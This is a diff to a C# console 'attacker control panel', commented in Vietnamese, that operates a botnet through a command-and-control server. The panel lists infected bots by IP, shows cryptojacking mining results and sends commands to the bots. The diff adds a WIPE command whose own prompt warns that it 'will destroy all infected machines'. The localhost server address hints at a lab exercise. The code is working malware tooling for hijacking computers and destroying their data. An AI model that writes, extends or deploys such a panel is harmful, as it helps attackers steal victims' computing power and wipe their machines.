@@ -7,14 +7,13 @@ using System.Threading.Tasks;
 using System.Collections.Generic;
 
 // =======================================================
-// === BẢNG ĐIỀU KHIỂN CỦA ATTACKER (GIAO DIỆN MỚI)    ===
+// === BẢNG ĐIỀU KHIỂN CỦA ATTACKER (UPDATED)          ===
 // =======================================================
 
-// === Bổ sung: Các class model để phân tích dữ liệu JSON từ server ===
 public class BotInfo
 {
     [JsonPropertyName("botId")]
-    public string BotId { get; set; }
+    public string BotId { get; set; } // Đây là IP của Bot
 
     [JsonPropertyName("lastSeen")]
     public DateTime LastSeen { get; set; }
@@ -38,10 +37,10 @@ public class CryptoJackResult
     public DateTime Timestamp { get; set; }
 }
 
-
 public class AttackerControlPanel
 {
-    // !!! QUAN TRỌNG: Đặt địa chỉ IP của máy ATTACKER VM vào đây
+    // !!! QUAN TRỌNG: Nếu chạy Panel cùng máy với Server thì để 127.0.0.1
+    // Nếu chạy khác máy thì điền IP của máy Server.
     private static readonly string CncServerIp = "127.0.0.1";
     private static readonly string CncServerUrl = $"http://{CncServerIp}:8000";
 
@@ -59,9 +58,8 @@ public class AttackerControlPanel
             Console.Write("Enter your choice: ");
             string choice = Console.ReadLine();
 
-            // Xóa màn hình trước khi xử lý để giao diện sạch sẽ
             Console.Clear();
-            ShowHeader(); // Hiển thị lại header để giữ ngữ cảnh
+            ShowHeader();
 
             bool shouldExit = await ProcessChoice(choice);
             if (shouldExit)
@@ -92,19 +90,24 @@ public class AttackerControlPanel
         Console.ForegroundColor = ConsoleColor.Yellow;
         Console.WriteLine("--- Bot Commands ---");
         Console.ResetColor();
-        Console.WriteLine(" [1] Issue Command: CRYPTOJACK (Start mining)");
-        Console.WriteLine(" [2] Issue Command: IDLE (Stop all tasks)");
+        Console.WriteLine(" [1] Command: CRYPTOJACK (Start mining)");
+        Console.WriteLine(" [2] Command: IDLE (Stop all tasks)");
+
+        // === THÊM LỆNH WIPE ===
+        Console.ForegroundColor = ConsoleColor.Red;
+        Console.WriteLine(" [3] Command: WIPE (!!! DESTROY TARGETS !!!)");
+        Console.ResetColor();
 
         Console.ForegroundColor = ConsoleColor.Yellow;
         Console.WriteLine("\n--- Monitoring ---");
         Console.ResetColor();
-        Console.WriteLine(" [3] List all active Bots");
-        Console.WriteLine(" [4] View collected Results");
+        Console.WriteLine(" [4] List all active Bots");
+        Console.WriteLine(" [5] View collected Results");
 
         Console.ForegroundColor = ConsoleColor.Yellow;
         Console.WriteLine("\n--- System ---");
         Console.ResetColor();
-        Console.WriteLine(" [5] Refresh Menu");
+        Console.WriteLine(" [6] Refresh Menu");
         Console.WriteLine(" [0] Exit Panel");
         Console.WriteLine();
     }
@@ -120,19 +123,34 @@ public class AttackerControlPanel
                 await SendCommandToServer("idle");
                 break;
             case "3":
-                await ListBots();
+                // Thêm xác nhận an toàn trước khi Wipe
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.Write("WARNING: This will destroy all infected machines. Are you sure? (y/n): ");
+                string confirm = Console.ReadLine();
+                Console.ResetColor();
+                if (confirm?.ToLower() == "y")
+                {
+                    await SendCommandToServer("wipe");
+                }
+                else
+                {
+                    Console.WriteLine("Operation cancelled.");
+                }
                 break;
             case "4":
-                await ViewResults();
+                await ListBots();
                 break;
             case "5":
-                // Chỉ cần tiếp tục vòng lặp là sẽ tự động làm mới
+                await ViewResults();
+                break;
+            case "6":
+                // Refresh (không làm gì cả, vòng lặp sẽ tự vẽ lại menu)
                 return false;
             case "0":
-                return true; // Tín hiệu để thoát chương trình
+                return true; // Thoát
             default:
                 Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("Invalid choice. Please select a valid option from the menu.");
+                Console.WriteLine("Invalid choice.");
                 Console.ResetColor();
                 break;
         }
@@ -152,6 +170,7 @@ public class AttackerControlPanel
             {
                 Console.ForegroundColor = ConsoleColor.Green;
                 Console.WriteLine($"SUCCESS: Command '{command}' was accepted by the server.");
+                Console.WriteLine("All bots checking in will now receive this command.");
             }
             else
             {
@@ -162,7 +181,8 @@ public class AttackerControlPanel
         catch (Exception ex)
         {
             Console.ForegroundColor = ConsoleColor.Red;
-            Console.WriteLine($"ERROR: Could not connect to the server. Details: {ex.Message}");
+            Console.WriteLine($"ERROR: Could not connect to the server. Is C&CServer.exe running?");
+            Console.WriteLine($"Details: {ex.Message}");
         }
         finally
         {
@@ -186,14 +206,13 @@ public class AttackerControlPanel
                 return;
             }
 
-            // In tiêu đề cho bảng
             Console.ForegroundColor = ConsoleColor.Cyan;
             Console.WriteLine($"\n--- Found {bots.Count} Bot(s) ---");
-            Console.WriteLine($"{"Bot ID",-38}{"Last Seen (UTC)",-25}{"Status"}");
+            // Cập nhật tiêu đề cột cho đúng với logic IP
+            Console.WriteLine($"{"Bot IP / ID",-38}{"Last Seen (UTC)",-25}{"Status"}");
             Console.WriteLine(new string('-', 80));
             Console.ResetColor();
 
-            // In thông tin từng bot
             foreach (var bot in bots)
             {
                 var timeAgo = DateTime.UtcNow - bot.LastSeen;
@@ -203,7 +222,7 @@ public class AttackerControlPanel
         catch (Exception ex)
         {
             Console.ForegroundColor = ConsoleColor.Red;
-            Console.WriteLine($"ERROR: Could not fetch bot list. Details: {ex.Message}");
+            Console.WriteLine($"ERROR: Could not fetch bot list. Is C&CServer.exe running?");
             Console.ResetColor();
         }
     }
@@ -226,7 +245,7 @@ public class AttackerControlPanel
 
             Console.ForegroundColor = ConsoleColor.Cyan;
             Console.WriteLine($"\n--- Found {results.Count} Result(s) ---");
-            Console.WriteLine($"{"Timestamp (UTC)",-25}{"Bot ID",-38}{"Nonce",-12}{"Hash"}");
+            Console.WriteLine($"{"Timestamp (UTC)",-25}{"Bot IP / ID",-38}{"Nonce",-12}{"Hash"}");
             Console.WriteLine(new string('-', 120));
             Console.ResetColor();
 
@@ -238,7 +257,7 @@ public class AttackerControlPanel
         catch (Exception ex)
         {
             Console.ForegroundColor = ConsoleColor.Red;
-            Console.WriteLine($"ERROR: Could not fetch results. Details: {ex.Message}");
+            Console.WriteLine($"ERROR: Could not fetch results. Is C&CServer.exe running?");
             Console.ResetColor();
         }
     }
